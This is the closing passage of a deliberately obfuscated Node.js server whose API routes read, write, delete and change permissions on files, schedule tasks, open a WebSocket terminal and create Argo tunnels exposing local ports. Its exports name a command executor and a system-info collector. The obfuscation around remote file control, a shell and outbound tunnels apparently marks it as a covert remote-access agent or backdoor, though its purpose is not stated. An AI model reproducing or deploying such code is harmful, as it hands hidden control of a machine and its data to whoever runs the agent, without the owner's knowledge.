                    'message': p[fj(0x346)]
                });
            }
        }), i[fa(0x88d)](b['zYOfo'], async (m, n) => {
            const fk = fa;
            try {
                const o = await a0W[fk(0x3bd)](m['body'][fk(0x4bd)] || []);
                n[fk(0x1d5)]({
                    'status': 'ok',
                    'files': o
                });
            } catch (p) {
                n[fk(0x765)](0x1f4)[fk(0x1d5)]({
                    'status': b[fk(0x5c4)],
                    'message': p[fk(0x346)]
                });
            }
        }), i[fa(0x303)]('/api/file/authority', async (m, n) => {
            const fl = fa;
            try {
                const o = m[fl(0x554)][fl(0x5d8)] || {}, p = m[fl(0x554)][fl(0x555)] === !![], q = await a0W[fl(0x76f)](o, p);
                n['json'](q);
            } catch (r) {
                n[fl(0x765)](0x1f4)[fl(0x1d5)]({
                    'status': b[fl(0x5c4)],
                    'message': r['message']
                });
            }
        }), i[fa(0x88d)](b[fa(0x7b4)], async (m, n) => {
            const fm = fa;
            try {
                const o = await a0W['readFile'](m[fm(0x554)][fm(0x793)]);
                n[fm(0x1d5)](o);
            } catch (p) {
                n['status'](0x1f4)['json']({
                    'status': b[fm(0x5c4)],
                    'message': p['message']
                });
            }
        }), i[fa(0x88d)](b[fa(0x2bb)], async (m, n) => {
            const fn = fa;
            try {
                const o = await a0W[fn(0x39e)](m[fn(0x554)][fn(0x793)], m['body'][fn(0x459)], m[fn(0x554)][fn(0x88e)], m[fn(0x554)][fn(0x72c)], m[fn(0x554)][fn(0x2af)]);
                n['json'](o);
            } catch (p) {
                n[fn(0x765)](0x1f4)[fn(0x1d5)]({
                    'status': b[fn(0x5c4)],
                    'message': p[fn(0x346)]
                });
            }
        }), i[fa(0x88d)](b[fa(0x82e)], a0f[fa(0x5a1)]({
            'type': b[fa(0x30a)],
            'limit': b[fa(0x335)]
        }), async (m, n) => {
            const fo = fa;
            try {
                const o = b[fo(0x6fc)](decodeURIComponent, m[fo(0x74e)][fo(0x23b)] || ''), p = b[fo(0x6fc)](decodeURIComponent, m[fo(0x74e)][b[fo(0x6a8)]] || ''), q = m[fo(0x74e)][b[fo(0x7e6)]], r = m[fo(0x74e)][b['xFOvc']];
                if (b[fo(0x859)](!o, !p))
                    return n['status'](0x190)[fo(0x1d5)]({
                        'status': b[fo(0x5c4)],
                        'completed': ![],
                        'message': fo(0x70d)
                    });
                const s = b[fo(0x4db)](q, undefined) ? b[fo(0x563)](parseInt, b[fo(0x6fc)](String, q), 0xa) : null, t = r !== undefined ? b['GpcQK'](parseInt, b[fo(0x1ee)](String, r), 0xa) : null, u = m[fo(0x554)];
                if (!Buffer['isBuffer'](u))
                    return n[fo(0x765)](0x190)[fo(0x1d5)]({
                        'status': 'error',
                        'completed': ![],
                        'message': b[fo(0x4b1)]
                    });
                const v = await a0W[fo(0x7e1)](o, p, u, s, t);
                n[fo(0x1d5)](v);
            } catch (w) {
                n[fo(0x765)](0x1f4)[fo(0x1d5)]({
                    'status': fo(0x484),
                    'completed': ![],
                    'message': w['message']
                });
            }
        }), i[fa(0x88d)](b[fa(0x3d0)], async (m, n) => {
            const fp = fa;
            try {
                const o = await a0W[fp(0x38d)](m[fp(0x554)]['path']), p = Buffer[fp(0x45b)](o['content'], b[fp(0x2dd)]);
                return n[fp(0x3f0)](b[fp(0x661)], o['size']['toString']()), n[fp(0x3f0)](b[fp(0x706)], o['path']), n[fp(0x3f0)](b[fp(0x87f)], fp(0x696)), n[fp(0x796)](p);
            } catch (q) {
                n[fp(0x765)](0x1f4)[fp(0x1d5)]({
                    'status': b[fp(0x5c4)],
                    'message': q[fp(0x346)]
                });
            }
        }), i['delete'](b[fa(0x2bb)], async (m, n) => {
            const fq = fa;
            try {
                let o = m[fq(0x554)][fq(0x4bd)];
                if (!o || !Array[fq(0x73e)](o)) {
                    o = [];
                    if (m[fq(0x554)][fq(0x793)])
                        o[fq(0x381)](m[fq(0x554)][fq(0x793)]);
                    if (m[fq(0x554)][fq(0x2ac)])
                        o[fq(0x381)](m[fq(0x554)][fq(0x2ac)]);
                }
                const p = await a0W[fq(0x3c9)](o);
                n['json']({
                    'status': 'ok',
                    'results': p
                });
            } catch (q) {
                n['status'](0x1f4)[fq(0x1d5)]({
                    'status': b['giXQf'],
                    'message': q[fq(0x346)]
                });
            }
        }), i[fa(0x303)](b[fa(0x2bb)], async (m, n) => {
            const fr = fa;
            try {
                const o = await a0W[fr(0x4a6)](m[fr(0x554)][fr(0x1f7)] || m['body']);
                n[fr(0x1d5)]({
                    'status': 'ok',
                    'total': o[fr(0x32c)],
                    'success': o[fr(0x4c7)](p => p[fr(0x765)] === 'ok')['length'],
                    'results': o
                });
            } catch (p) {
                n[fr(0x765)](0x1f4)[fr(0x1d5)]({
                    'status': b['giXQf'],
                    'message': p[fr(0x346)]
                });
            }
        }), i[fa(0x88d)]('/api/file/cp', async (m, n) => {
            const ft = fa;
            try {
                const o = await a0W[ft(0x889)](m['body']);
                n['json']({
                    'status': 'ok',
                    'total': o['length'],
                    'success': o[ft(0x4c7)](p => p[ft(0x765)] === 'ok')[ft(0x32c)],
                    'results': o
                });
            } catch (p) {
                n['status'](0x1f4)[ft(0x1d5)]({
                    'status': b['giXQf'],
                    'message': p['message']
                });
            }
        }), i[fa(0x88d)](b[fa(0x531)], async (m, n) => {
            const fu = fa;
            try {
                const o = await a0W[fu(0x519)](m[fu(0x554)][fu(0x793)]);
                n[fu(0x1d5)](o);
            } catch (p) {
                n['status'](0x1f4)[fu(0x1d5)]({
                    'status': b['giXQf'],
                    'message': p['message']
                });
            }
        }), i[fa(0x52b)](b[fa(0x5e8)], (m, n) => {
            const fv = fa;
            n[fv(0x1d5)](a0X[fv(0x60a)]());
        }), i['post'](b[fa(0x5e8)], async (m, n) => {
            const fw = fa;
            try {
                const o = await a0X['setOnetimeTasks'](m['body']);
                n[fw(0x1d5)](o);
            } catch (p) {
                n[fw(0x765)](0x1f4)['json']({
                    'status': b[fw(0x5c4)],
                    'message': p['message']
                });
            }
        }), i['get'](fa(0x1f6), (m, n) => {
            const fx = fa;
            n[fx(0x1d5)](a0X[fx(0x2bc)]());
        }), i[fa(0x88d)](b[fa(0x558)], (m, n) => {
            const fy = fa;
            try {
                const o = a0X[fy(0x7d2)](m[fy(0x554)]);
                n[fy(0x1d5)](o);
            } catch (p) {
                n[fy(0x765)](0x1f4)[fy(0x1d5)]({
                    'status': b[fy(0x5c4)],
                    'message': p[fy(0x346)]
                });
            }
        }), i['get'](b[fa(0x7d1)], (m, n) => {
            const fz = fa;
            n[fz(0x1d5)](a0X[fz(0x1e6)]());
        }), i[fa(0x52b)](b['OfWQR'], (m, n) => {
            const fA = fa;
            let o = b['IDdcR'](parseInt, m[fA(0x73f)][fA(0x6a9)], 0xa) || 0x32;
            o = Math['min'](Math[fA(0x6d4)](o, 0x1), 0x64), n['json'](a0X[fA(0x72e)](o));
        }), i[fa(0x52b)](b[fa(0x622)], (m, n) => {
            const fB = fa;
            let o = b[fB(0x654)](parseInt, m[fB(0x73f)][fB(0x6a9)], 0xa) || 0x32;
            o = Math[fB(0x369)](Math[fB(0x6d4)](o, 0x1), 0x64), n[fB(0x1d5)](a0X[fB(0x5f4)](o));
        }), i[fa(0x3e7)](b[fa(0x2d3)], (m, n) => {
            const fC = fa;
            n[fC(0x1d5)](a0X['clearOnetimeLogs']());
        }), i[fa(0x3e7)]('/api/task/log/cron', (m, n) => {
            const fD = fa;
            n[fD(0x1d5)](a0X[fD(0x1f0)]());
        }), i[fa(0x52b)](b[fa(0x4c6)], (m, n) => {
            n['json'](a0X['getLogSummary']());
        }), i[fa(0x88d)](b[fa(0x5e6)], async (m, n) => {
            const fE = fa;
            try {
                const o = await a0X[fE(0x301)]();
                n[fE(0x1d5)](o);
            } catch (p) {
                n['status'](0x1f4)[fE(0x1d5)]({
                    'status': 'error',
                    'message': p['message']
                });
            }
        });
        const j = {
                'debug': (...m) => a0C[fa(0x4b3)](m[fa(0x48d)]('\x20')),
                'info': (...m) => a0C[fa(0x524)](m['join']('\x20')),
                'warning': (...m) => a0C[fa(0x82d)](m[fa(0x48d)]('\x20'))
            }, k = new a0aF(j);
        i['get'](b[fa(0x58c)], (m, n) => {
            const fF = fa, o = k[fF(0x3a8)]();
            n[fF(0x1d5)]({
                'status': 'ok',
                'count': o['length'],
                'tunnels': o
            });
        }), i[fa(0x88d)](fa(0x6bd), async (m, n) => {
            const fG = fa;
            try {
                const o = b['yADmv'](a0aE, m[fG(0x554)]);
                let p = o[fG(0x643)];
                (b[fG(0x273)](p, undefined) || b[fG(0x5a9)](p, null) || b[fG(0x273)](p, '')) && (p = a0O[fG(0x569)]);
                const q = b[fG(0x1ee)](Number, p);
                if (!Number[fG(0x322)](q) || b['fkdMw'](q, 0x1) || q > 0xffff)
                    return n['status'](0x1a6)[fG(0x1d5)]({
                        'status': b[fG(0x5c4)],
                        'created': ![],
                        'port': p,
                        'message': 'port\x20must\x20be\x20an\x20integer\x20between\x201\x20and\x2065535'
                    });
                const r = await k['create'](q, o[fG(0x399)] === !![]);
                n[fG(0x1d5)]({
                    'status': 'ok',
                    'created': !![],
                    'tunnel_domain': r[fG(0x69c)],
                    'port': r[fG(0x643)],
                    'created_at': r[fG(0x54a)]
                });
            } catch (s) {
                n[fG(0x765)](s[fG(0x765)] || 0x1f4)[fG(0x1d5)]({
                    'status': b['giXQf'],
                    'created': ![],
                    'port': s['port'] ?? null,
                    'message': s[fG(0x346)]
                });
            }
        }), i[fa(0x3e7)]('/api/argo', async (m, n) => {
            const fH = fa;
            try {
                const o = b[fH(0x587)](a0aE, m['body']), p = o['port'], q = b[fH(0x80c)](Number, p);
                if (b[fH(0x7f6)](p, undefined) || b[fH(0x7cd)](p, null) || b[fH(0x5f6)](p, '') || !Number[fH(0x322)](q) || b[fH(0x639)](q, 0x1) || b[fH(0x868)](q, 0xffff))
                    return n[fH(0x765)](0x1a6)['json']({
                        'status': b[fH(0x5c4)],
                        'deleted': 0x0,
                        'port': b[fH(0x64b)](p, null),
                        'message': b[fH(0x87d)]
                    });
                const r = await k['remove'](q, o[fH(0x69d)]);
                if (b[fH(0x57e)](r['status'], 'ok'))
                    return n[fH(0x1d5)]({
                        'status': 'ok',
                        'deleted': r[fH(0x831)],
                        'port': q,
                        'tunnels': r[fH(0x45d)]
                    });
                return n[fH(0x765)](r[fH(0x765)])[fH(0x1d5)]({
                    'status': b['giXQf'],
                    'deleted': 0x0,
                    'port': q,
                    'message': r[fH(0x346)]
                });
            } catch (s) {
                n[fH(0x765)](0x1f4)['json']({
                    'status': b['giXQf'],
                    'deleted': 0x0,
                    'message': s[fH(0x346)]
                });
            }
        }), a0C['debug'](b[fa(0x28e)]), i['ws'](b['izGRs'], async (m, n) => {
            const fI = fa, o = n['params'][0x0];
            a0C[fI(0x4b3)](fI(0x20d) + n[fI(0x3aa)]), a0C['debug'](fI(0x5a0) + o);
            const p = n['query']['request_id'], q = n['query'][fI(0x771)];
            a0C[fI(0x4b3)](fI(0x626) + p);
            if (!p) {
                a0C[fI(0x4b3)](fI(0x650)), m[fI(0x6af)](0x3f0, b[fI(0x856)]);
                return;
            }
            if (q) {
                const s = a0O['wsDowngradeToken'](), t = Buffer[fI(0x45b)](String(q), b['YaAig']), u = Buffer[fI(0x45b)](s, fI(0x3fb)), v = t[fI(0x32c)] === u['length'] && a0k['timingSafeEqual'](t, u);
                if (!v) {
                    a0C[fI(0x82d)]('[终端会话\x20' + p + fI(0x49c)), m['close'](0x3f0, fI(0x25b));
                    return;
                }
            }
            const r = new a0aM();
            await r[fI(0x4c5)](m, p, q);
        }), a0C[fa(0x4b3)](b[fa(0x2fc)]), a0C[fa(0x4b3)](b[fa(0x507)]);
        const l = i['listen'](a0O[fa(0x569)], a0O['HOST'], () => {
            const fJ = fa;
            a0C[fJ(0x4b3)](fJ(0x52f) + a0O[fJ(0x3b7)] + fJ(0x88f) + a0O[fJ(0x693)] + ':' + a0O['PORT']), a0C['debug'](b[fJ(0x4fd)]), (a0O['KMODE'] === '1' || b[fJ(0x34d)](a0O[fJ(0x61a)], '2') && a0aG[fJ(0x22e)]()) && a0aG[fJ(0x6a7)](k);
        });
        process['on'](b[fa(0x502)], () => {
            const fK = fa;
            a0C['debug']('Shutting\x20down...'), l['close'](), process[fK(0x6e0)](0x0);
        }), a0C['debug'](b[fa(0x5bf)]);
    } catch (m) {
        a0C[fa(0x484)](b[fa(0x6c5)], m), process[fa(0x6e0)](0x1);
    }
}
(require[a0aQ(0x660)] === module || require['main']?.[a0aQ(0x459)]?.[a0aQ(0x50f)](a0aQ(0x55f))) && a0aN()[a0aQ(0x5e7)](a0C[a0aQ(0x484)]);
module['exports'] = {
    'main': a0aN,
    'Config': a0O,
    'CryptoManager': a0Q,
    'SystemInfoCollector': a0T,
    'CommandExecutor': a0U,
    'FileManager': a0W,
    'TaskManager': a0X,
    'ArgoTunnelManager': a0aF,
    'KModeController': a0aG
};